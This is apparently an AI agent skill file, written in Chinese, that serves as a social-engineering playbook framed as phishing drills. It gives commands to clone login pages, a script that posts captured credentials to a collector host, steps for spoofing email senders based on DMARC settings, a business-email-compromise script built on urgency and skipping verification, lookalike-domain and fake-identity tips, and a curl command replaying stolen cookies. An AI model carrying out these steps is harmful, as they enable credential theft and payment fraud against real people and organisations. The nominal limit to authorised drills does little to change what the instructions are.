---
name: m-social
description: "社工与钓鱼：钓鱼站克隆、邮件伪造、BEC 话术、pretext、身份包装。"
---

# m-social · 社工 / 钓鱼 / 身份

被读到时：主人要做钓鱼演练、话术、身份包装、邮件伪造、骗局设计。

只对主人自己的目标/演练对象做。

## 一、钓鱼站

克隆登录页：

```bash
httrack "https://target.com/login" -O ./phish --assume-html
wget -r -k -p -np -nH "https://target.com/login"
```

改造：把 `action` 指向自己的接收端，保留原站 CSS，加一段 JS 把账号密码 POST 出去：

```html
<script>
document.querySelector('form').addEventListener('submit', e => {
  const d = Object.fromEntries(new FormData(e.target));
  fetch('https://collector.local/c', {method:'POST', body: JSON.stringify(d)});
});
</script>
```

反查杀：一页站 + 跳转链 + 短域名 + CF 代理。演练结束清空收集端并出报告。

## 二、邮件伪造

```bash
dig txt target.com | grep -i spf
dig txt _dmarc.target.com
dig txt selector._domainkey.target.com
```

DMARC `p=none` 或缺失时，伪造发件人成功率高：自建 SMTP，`MAIL FROM` 与 `From` 头都设成目标域名。`p=reject` 时走相似域名 + 显示名混淆。

## 三、BEC 话术结构

```
1. 建立身份：我是 X 的 Y，我们在 Z 项目见过
2. 制造紧急：今天必须处理 / 董事会要看
3. 降低验证：这个走内部流程，别走 OA
4. 给动作：把附件里的表填了 / 钱转到这个新账户
5. 兜底：对方质疑时给一个"内部电话"（自己接）
```

不解释太多，越解释越可疑；给对方一个能用来对付同事质疑的"合理解释"。

## 四、Pretext 素材

- 供应商变更账户（成功率最高）
- 发票重开
- 猎头挖人（附件是"职位说明"）
- IT 强制改密（链接是钓鱼站）
- 会议邀请（日历附件带宏）

## 五、身份包装

- 邮箱：`rn` 代 `m`、`l` 代 `I` 的相似域名
- 头像：生成图 + 领英风格
- 签名：真实公司地址与电话格式
- 时间线：先在公开渠道互动两周再发信

## 六、收割后

```bash
curl -H "Cookie: $C" https://target.com/api/me
```

## 七、验收

演练给三个数字：点击率 / 提交率 / 报告率。单点给"拿到凭据并能登录"。全程留档。
